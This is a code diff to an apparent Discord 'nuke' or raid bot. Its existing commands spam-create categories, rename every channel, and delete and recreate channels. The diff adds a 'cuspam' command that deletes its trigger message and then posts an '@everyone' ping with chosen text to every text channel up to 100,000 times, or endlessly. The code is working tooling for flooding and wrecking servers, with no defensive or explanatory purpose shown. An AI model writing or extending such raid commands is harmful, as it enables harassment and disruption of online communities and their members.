@@ -59,6 +59,7 @@ async def cmds(ctx):
  embed.add_field(name="cate",value="Spam creates categorys.", inline=False)
  embed.add_field(name="chancust <channel names>",value="Creates channel names of your choice.", inline=False)
  embed.add_field(name="rename <channel name>",value="Renames all channels.", inline=False)
+ embed.add_field(name="cuspam <spam text>",value="Make spam of your choice.", inline=False)
 
 @bot.command(pass_context=True)
 async def nick(ctx, rename_to):
@@ -239,6 +240,18 @@ async def delete(ctx):
     await channel.delete()
   await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
   await ctx.guild.create_voice_channel(random.choice(CHANNEL_NAMES))
+
+@bot.command(pass_context=True)
+async def cuspam(ctx, *, message, amount=100000):
+    await ctx.message.delete()
+    if not amount is None:
+        for _ in range(amount):
+            for channel in ctx.guild.text_channels:
+              await channel.send(f"@everyone {message}")
+    else:
+        while True:  
+            for channel in ctx.guild.text_channels:      
+              await channel.send(f"@everyone {message}")
 
 @bot.command(pass_context=True)
 async def channels(ctx, amount=500):
